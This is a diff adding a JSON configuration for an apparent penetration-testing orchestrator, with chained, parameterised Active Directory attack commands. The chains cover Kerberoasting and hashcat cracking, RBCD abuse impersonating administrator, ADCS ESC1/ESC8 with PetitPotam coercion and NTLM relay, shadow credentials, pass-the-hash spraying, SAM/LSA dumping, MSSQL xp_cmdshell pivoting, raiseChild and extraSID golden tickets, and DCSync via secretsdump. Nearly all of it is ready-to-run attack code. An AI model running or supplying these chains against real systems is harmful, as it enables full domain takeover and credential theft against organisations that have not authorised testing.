@@ -1,0 +1,541 @@
+{
+  "_meta": "链式执行:steps 顺序跑,失败即停(optional:true 则继续);params 链级只填一次;敏感字段 sens 自动脱敏入史。",
+  "chains": [
+    {
+      "id": "onboard",
+      "name": "接入链",
+      "desc": "对时+DNS+krb5 → 一把梭侦察(阶段0→1)",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "dcfqdn",
+          "l": "域控FQDN",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "域用户(可空)"
+        },
+        {
+          "k": "pass",
+          "l": "密码(可空)",
+          "sens": 1
+        },
+        {
+          "k": "net",
+          "l": "网段CIDR",
+          "req": 1,
+          "def": "10.10.10.0/24"
+        }
+      ],
+      "steps": [
+        {
+          "name": "接入准备",
+          "cmd": "~/tools/bin/domain-setup.sh {{domain}} {{dcip}} {{dcfqdn}} {{user}} {{pass}}",
+          "sudo": true,
+          "timeout": 60
+        },
+        {
+          "name": "一把梭侦察",
+          "cmd": "~/tools/bin/ad-sweep.sh {{net}} {{dcip}} {{user}} {{pass}}",
+          "timeout": 300
+        }
+      ]
+    },
+    {
+      "id": "kerb",
+      "name": "Kerberoast 链",
+      "desc": "抓 TGS → 自动入破解队列 → hashcat 一把跑(阶段2)",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        }
+      ],
+      "steps": [
+        {
+          "name": "抓 TGS",
+          "cmd": "impacket-GetUserSPNs {{domain}}/{{user}}:{{pass}} -dc-ip {{dcip}} -request -outputfile hashqueue_kerb.txt",
+          "timeout": 300
+        },
+        {
+          "name": "破解队列",
+          "cmd": "hashcat -m 13100 hashqueue_kerb.txt /usr/share/wordlists/rockyou.txt -O --show --force | head -20; hashcat -m 13100 hashqueue_kerb.txt /usr/share/wordlists/rockyou.txt -O --force",
+          "timeout": 1800,
+          "optional": true
+        }
+      ]
+    },
+    {
+      "id": "rbcd",
+      "name": "RBCD 全链",
+      "desc": "建机户→写委托→S4U取票(阶段4,收官提示 psexec -k)",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "有写权限用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "victim",
+          "l": "目标机器名(不带$)",
+          "req": 1
+        },
+        {
+          "k": "newpass",
+          "l": "新机器户密码(留空=自动生成)",
+          "sens": 1,
+          "auto": "pass"
+        }
+      ],
+      "steps": [
+        {
+          "name": "① 建受控机户",
+          "cmd": "impacket-addcomputer -computer-name 'EVIL$' -computer-pass {{newpass}} -dc-ip {{dcip}} '{{domain}}/{{user}}:{{pass}}'",
+          "confirm": true,
+          "timeout": 120
+        },
+        {
+          "name": "② 写 RBCD 委托",
+          "cmd": "impacket-rbcd '{{domain}}/{{user}}:{{pass}}' -dc-ip {{dcip}} -action write -delegate-to '{{victim}}$' -delegate-from 'EVIL$'",
+          "danger": true,
+          "confirm": true,
+          "timeout": 120
+        },
+        {
+          "name": "③ S4U 取票",
+          "cmd": "impacket-getST '{{domain}}/EVIL$:{{newpass}}' -spn host/{{victim}}.{{domain}} -impersonate administrator -dc-ip {{dcip}}",
+          "timeout": 120
+        },
+        {
+          "name": "④ 收官提示",
+          "cmd": "echo '票据已生成 administrator.ccache → export KRB5CCNAME=$PWD/administrator.ccache && impacket-psexec -k -no-pass {{domain}}/administrator@{{victim}}.{{domain}}'"
+        }
+      ]
+    },
+    {
+      "id": "esc1",
+      "name": "ADCS ESC 链",
+      "desc": "摸底→(人工看ESC)→申请→换哈希(阶段4)",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "ca",
+          "l": "CA名(摸底输出里找)",
+          "req": 1
+        },
+        {
+          "k": "template",
+          "l": "模板名(ESC1 类)",
+          "req": 1,
+          "def": "User"
+        }
+      ],
+      "steps": [
+        {
+          "name": "① ADCS 摸底",
+          "cmd": "certipy find -u {{user}}@{{domain}} -p {{pass}} -dc-ip {{dcip}} -vulnerable -text | grep -E 'ESC[0-9]+|CA Name|Template Name' | head -40",
+          "timeout": 300
+        },
+        {
+          "name": "② 申请证书",
+          "cmd": "certipy req -u {{user}}@{{domain}} -p {{pass}} -ca {{ca}} -template {{template}} -dc-ip {{dcip}} -out cert.pfx",
+          "danger": true,
+          "confirm": true,
+          "timeout": 300
+        },
+        {
+          "name": "③ 证书→哈希",
+          "cmd": "certipy auth -pfx cert.pfx -dc-ip {{dcip}}",
+          "confirm": true,
+          "timeout": 300
+        }
+      ]
+    },
+    {
+      "id": "wg",
+      "name": "工作组碰撞链",
+      "desc": "空会话枚举→单哈希全网喷→雪球提示(工作组场景)",
+      "params": [
+        {
+          "k": "net",
+          "l": "网段CIDR",
+          "req": 1,
+          "def": "192.168.1.0/24"
+        },
+        {
+          "k": "user",
+          "l": "本地账户",
+          "req": 1,
+          "def": "administrator"
+        },
+        {
+          "k": "nthash",
+          "l": "NT哈希",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "steps": [
+        {
+          "name": "① 空会话用户枚举",
+          "cmd": "nxc smb {{net}} -u '' -p '' --rid-brute 2>/dev/null | grep -E '500:|1000:' | head -20 || echo '空会话被拒,跳过'",
+          "timeout": 300,
+          "optional": true
+        },
+        {
+          "name": "② 单哈希全网喷洒",
+          "cmd": "nxc smb {{net}} -u {{user}} -H {{nthash}} --local-auth --continue-on-success",
+          "confirm": true,
+          "timeout": 600
+        },
+        {
+          "name": "③ 雪球提示",
+          "cmd": "echo '命中主机→逐台: nxc smb <IP> -u {{user}} -H {{nthash}} --local-auth --sam(新哈希回本链重跑);Pwn3d→wmiexec ./{{user}}@<IP> -hashes :{{nthash}}'"
+        }
+      ]
+    },
+    {
+      "id": "wg-reap",
+      "name": "工作组命中收割链",
+      "desc": "碰撞命中后三连:溯源(谁连的)+SAM 全量+共享定向(接工作组碰撞链)",
+      "params": [
+        {
+          "k": "ip",
+          "l": "命中机器IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "本地账户",
+          "req": 1,
+          "def": "administrator"
+        },
+        {
+          "k": "nthash",
+          "l": "NT哈希",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "steps": [
+        {
+          "name": "① 连接溯源(谁连过来的/连过谁)",
+          "cmd": "nxc smb {{ip}} -u {{user}} -H {{nthash}} --local-auth -X \"cmd.exe /c \\\"net sessions & netstat -ano -p tcp | findstr ESTABLISHED & arp -a\\\"\"",
+          "timeout": 300
+        },
+        {
+          "name": "② SAM/LSA 全量(雪球弹药)",
+          "cmd": "nxc smb {{ip}} -u {{user}} -H {{nthash}} --local-auth --sam --lsa",
+          "confirm": true,
+          "timeout": 300
+        },
+        {
+          "name": "③ 共享定向搜索",
+          "cmd": "nxc smb {{ip}} -u {{user}} -H {{nthash}} --local-auth -M spider_plus -o EXCLUDE_EXTS=dll,exe,sys,msi,ico,lnk DOWNLOAD_FLAG=True MAX_FILE_SIZE=999kb",
+          "timeout": 900,
+          "optional": true
+        }
+      ]
+    },
+    {
+      "id": "shadow",
+      "name": "影子凭据链",
+      "desc": "pywhisker 挂 keycredential → PFX 换 TGT+哈希(阶段5,收官提示 KRB5CCNAME)",
+      "params": [
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "有写权限用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "target",
+          "l": "被加影子凭据对象(机器名带$)",
+          "req": 1
+        }
+      ],
+      "steps": [
+        {
+          "name": "① 添加影子凭据",
+          "cmd": "python3 ~/tools/src/pywhisker/pywhisker/pywhisker.py -d {{domain}} -u {{user}} -p {{pass}} --dc-ip {{dcip}} --target {{target}} --action add --filename {{target}} -P ShadowChain2026",
+          "danger": true,
+          "confirm": true,
+          "checkpoint": "shadow-add",
+          "timeout": 120
+        },
+        {
+          "name": "② PFX 换 TGT+哈希",
+          "cmd": "certipy auth -pfx {{target}}.pfx -password ShadowChain2026 -dc-ip {{dcip}}",
+          "timeout": 300
+        },
+        {
+          "name": "③ 收官提示",
+          "cmd": "echo \"TGT 已生成 {{target}}.ccache → export KRB5CCNAME=\\$PWD/{{target}}.ccache;机器户接着 rbcd 链取票,DC\\$ 直接 impacket-secretsdump -k -no-pass {{domain}}/{{target}}@{{dcip}}\""
+        }
+      ]
+    },
+    {
+      "id": "esc8",
+      "name": "ADCS Web 中继链",
+      "desc": "查 Web Enrollment → 起 relay 占位 → PetitPotam 触发 → certipy auth 收官(ESC8,半自动)",
+      "params": [
+        {
+          "k": "dcip",
+          "l": "域控IP",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "ca",
+          "l": "CA主机(FQDN/IP)",
+          "req": 1
+        }
+      ],
+      "steps": [
+        {
+          "name": "① 检查 Web Enrollment",
+          "cmd": "certipy find -u {{user}}@{{domain}} -p {{pass}} -dc-ip {{dcip}} -stdout | grep -i 'Web Enrollment'",
+          "checkpoint": "esc8-check",
+          "timeout": 300
+        },
+        {
+          "name": "② 启动 relay 占位",
+          "cmd": "echo '人工步:到执行台启动工具 relay-ca(ntlmrelayx -t http://{{ca}}/certsrv/certfnsh.asp --adcs,bg 长任务),监听就绪后再继续'",
+          "optional": true
+        },
+        {
+          "name": "③ PetitPotam 触发 DC 回连",
+          "cmd": "python3 ~/tools/src/PetitPotam/petitpotam.py -dc-ip {{dcip}} {{domain}}/{{user}}:{{pass}}@{{dcip}} \"\\\\\\\\$(hostname -I | cut -d' ' -f1)\\\\\\\\share\"",
+          "confirm": true,
+          "timeout": 120
+        },
+        {
+          "name": "④ 收官提示",
+          "cmd": "echo 'relay 抓到机器证书后:certipy auth -pfx <机器户>.pfx -dc-ip {{dcip}} 得 DC$ 哈希 → impacket-secretsdump {{domain}}/<DC>$@{{dcip}} -hashes :<哈希> 走 DCSync'"
+        }
+      ]
+    },
+    {
+      "id": "mssql-links",
+      "name": "MSSQL 链接服务器横向链",
+      "desc": "nxc mssql 枚举 → 链接爬取 → xp_cmdshell 逐跳提示(文档14)",
+      "params": [
+        {
+          "k": "targets",
+          "l": "目标IP/CIDR",
+          "req": 1
+        },
+        {
+          "k": "domain",
+          "l": "域名",
+          "req": 1
+        },
+        {
+          "k": "user",
+          "l": "用户",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        }
+      ],
+      "steps": [
+        {
+          "name": "① MSSQL 服务枚举",
+          "cmd": "nxc mssql {{targets}}",
+          "timeout": 300
+        },
+        {
+          "name": "② 链接服务器爬取",
+          "cmd": "nxc mssql {{targets}} -u {{user}} -p {{pass}} -d {{domain}} -M enum_links",
+          "timeout": 300
+        },
+        {
+          "name": "③ xp_cmdshell 逐跳提示",
+          "cmd": "echo \"命中链接后逐跳开 xp_cmdshell: nxc mssql <IP> -u {{user}} -p {{pass}} -M link_enable_cmdshell -o LINKED_SERVER=<链接名> → 再 -M link_xpcmd -o LINKED_SERVER=<链接名> CMD=whoami(命令形态见文档14)\"",
+          "optional": true
+        }
+      ]
+    },
+    {
+      "id": "cross-domain",
+      "name": "跨域推进链",
+      "desc": "信任枚举→子/父域 SID→raiseChild 拿 EA→extraSID 金票→收官提示(阶段4/5;②③输出供人手抄到 childsid/parentsid,⑤ 参数未填齐会失败属正常 optional)",
+      "params": [
+        {
+          "k": "user",
+          "l": "子域 DA",
+          "req": 1
+        },
+        {
+          "k": "pass",
+          "l": "密码",
+          "req": 1,
+          "sens": 1
+        },
+        {
+          "k": "cdomain",
+          "l": "子域名",
+          "req": 1
+        },
+        {
+          "k": "pdomain",
+          "l": "父域名(林根)",
+          "req": 1
+        },
+        {
+          "k": "cdcip",
+          "l": "子域域控IP",
+          "req": 1
+        },
+        {
+          "k": "childsid",
+          "l": "子域SID(②输出手填,空=跳⑤)"
+        },
+        {
+          "k": "parentsid",
+          "l": "父域SID去尾519(③输出手填,空=跳⑤)"
+        },
+        {
+          "k": "nthash",
+          "l": "子域krbtgt NT(空=跳⑤)",
+          "sens": 1
+        }
+      ],
+      "steps": [
+        {
+          "name": "① 信任拓扑枚举",
+          "cmd": "PROJ_DIR=${PROJ_DIR:-} ~/tools/bin/trust-map.sh {{user}} {{pass}}",
+          "checkpoint": "trust-map",
+          "timeout": 300
+        },
+        {
+          "name": "② 子域 SID 获取",
+          "cmd": "impacket-lookupsid '{{cdomain}}/{{user}}:{{pass}}@{{cdcip}}' 0 | grep -oE 'S-1-5-21-[0-9-]+' | head -1",
+          "timeout": 120
+        },
+        {
+          "name": "③ 父域 SID 获取",
+          "cmd": "impacket-lookupsid '{{pdomain}}/{{user}}:{{pass}}@{{pdomain}}' 0 | grep -oE 'S-1-5-21-[0-9-]+' | head -1",
+          "timeout": 120
+        },
+        {
+          "name": "④ raiseChild 拿 EA",
+          "cmd": "impacket-raiseChild '{{cdomain}}/{{user}}:{{pass}}' -dc-ip {{cdcip}} -w raisechild.ccache",
+          "danger": true,
+          "confirm": true,
+          "checkpoint": "raise-child",
+          "timeout": 300
+        },
+        {
+          "name": "⑤ extraSID 金票",
+          "cmd": "impacket-ticketer -domain {{cdomain}} -domain-sid {{childsid}} -extra-sid {{parentsid}}-519 -nthash {{nthash}} -dc-ip {{cdcip}} administrator",
+          "danger": true,
+          "confirm": true,
+          "optional": true,
+          "timeout": 120
+        },
+        {
+          "name": "⑥ 收官提示",
+          "cmd": "echo \"票据已备:raisechild.ccache(④)/administrator.ccache(⑤)→ export KRB5CCNAME=\\$PWD/raisechild.ccache && impacket-psexec -k -no-pass {{pdomain}}/administrator@<父域控FQDN>;跨域 DCSync: impacket-secretsdump -k -no-pass '{{pdomain}}/administrator@<父域控FQDN>' -just-dc -just-dc-user Administrator;⑤ 步 childsid/parentsid/nthash 未填齐失败属正常(optional),④ 的 ccache 已够上父域\""
+        }
+      ]
+    }
+  ]
+}
